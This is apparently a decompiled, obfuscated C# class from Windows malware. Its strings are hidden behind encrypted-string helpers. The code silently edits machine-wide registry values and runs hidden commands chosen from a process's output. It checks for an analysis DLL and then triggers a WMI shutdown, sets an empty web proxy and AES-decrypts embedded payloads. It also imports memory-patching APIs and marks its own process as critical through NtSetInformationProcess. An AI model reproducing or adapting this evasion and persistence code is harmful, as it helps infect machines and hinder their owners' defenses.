using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using _003CPrivateImplementationDetails_003E_007B53EE5BDF_002DC925_002D45D0_002DBB4F_002D1DE255E331E5_007D;
using Microsoft.Win32;

namespace ns0;

internal class Class4
{
	public static void smethod_0(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	public static void smethod_1()
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_22(),
				Arguments = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_23(),
				UseShellExecute = false,
				RedirectStandardOutput = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
		while (!process.StandardOutput.EndOfStream)
		{
			string text = process.StandardOutput.ReadLine();
			if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_24()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_26());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_15()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_27());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_28()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_29());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_30()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_31());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_32()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_33());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_34()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_35());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_36()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_37());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_38()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_39());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_40()) && text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_25()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_41());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_42()) && !text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_43()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_44());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_45()) && !text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_46());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_47()) && !text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_48()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_49());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_50()) && !text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_48()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_51());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_52()) && !text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_48()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_53());
			}
			else if (text.StartsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_54()) && !text.EndsWith(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_48()))
			{
				smethod_2(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_55());
			}
		}
	}

	private static void smethod_2(string string_0)
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_22(),
				Arguments = string_0,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
	}

	public static void smethod_3()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_56());
		((ManagementObject)val).Get();
		((ManagementObject)val).get_Scope().get_Options().set_EnablePrivileges(true);
		ManagementBaseObject methodParameters = ((ManagementObject)val).GetMethodParameters(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_57());
		methodParameters.set_Item(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_58(), (object)F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_48());
		methodParameters.set_Item(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_59(), (object)F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10());
		ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				val2.InvokeMethod(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_57(), methodParameters, (InvokeMethodOptions)null);
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void smethod_4()
	{
		try
		{
			if (LoadLibraryA(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_60()) != IntPtr.Zero)
			{
				smethod_3();
				Environment.Exit(1);
			}
		}
		catch
		{
		}
	}

	public static void smethod_5()
	{
		WebRequest.DefaultWebProxy = new WebProxy();
	}

	public static string smethod_6()
	{
		string text = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_61();
		char[] array = new char[40];
		Random random = new Random();
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = text[random.Next(text.Length)];
		}
		new string(array);
		return new string(array);
	}

	public static string smethod_7()
	{
		string text = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_62();
		char[] array = new char[10];
		Random random = new Random();
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = text[random.Next(text.Length)];
		}
		new string(array);
		return new string(array);
	}

	public static void smethod_8()
	{
		smethod_11(1);
	}

	public static void smethod_9()
	{
		smethod_11(0);
	}

	public static string smethod_10(string string_0, byte[] byte_0, byte[] byte_1)
	{
		Aes aes = Aes.Create();
		aes.Mode = CipherMode.CBC;
		byte[] array = new byte[32];
		Array.Copy(byte_0, 0, array, 0, 32);
		aes.Key = array;
		aes.IV = byte_1;
		MemoryStream memoryStream = new MemoryStream();
		ICryptoTransform transform = aes.CreateDecryptor();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
		string result = string.Empty;
		try
		{
			byte[] array2 = Convert.FromBase64String(string_0);
			cryptoStream.Write(array2, 0, array2.Length);
			cryptoStream.FlushFinalBlock();
			byte[] array3 = memoryStream.ToArray();
			result = Encoding.ASCII.GetString(array3, 0, array3.Length);
		}
		finally
		{
			memoryStream.Close();
			cryptoStream.Close();
		}
		return result;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.LPStr)] string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPStr)] string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.LPStr)] string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool VirtualProtect(IntPtr intptr_0, uint uint_0, uint uint_1, out uint uint_2);

	[DllImport("Kernel32.dll")]
	private static extern void RtlZeroMemory(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	public static void smethod_11(int int_0)
	{
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
	}
}
